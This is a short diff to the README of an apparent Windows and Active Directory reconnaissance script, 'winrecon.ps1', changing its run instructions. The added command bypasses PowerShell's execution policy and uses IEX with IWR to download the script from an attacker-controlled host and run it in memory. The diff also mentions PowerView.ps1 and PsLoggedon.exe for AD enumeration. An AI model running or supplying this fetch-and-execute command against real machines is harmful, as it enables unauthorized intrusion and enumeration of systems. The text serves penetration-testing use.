@@ -18,10 +18,17 @@
 
 ---
 
-## Usage
+## How to Run
 
 1. **Upload** the `winrecon.ps1` script to the target Windows machine.
-2. **Open PowerShell** with administrator privileges on the target machine.
+2. **Open PowerShell**.
 3. Run the script with the following command:
    ```powershell
-   .\winrecon.ps1
+   powershell -ep Bypass -Command 'IEX(IWR http://<LocalHost>/winrecon.ps1 -UseBasicParsing)'
+   ```
+
+4. For full AD options you will need to download PsLoggedon.exe and PowerView.ps1
+
+
+
+
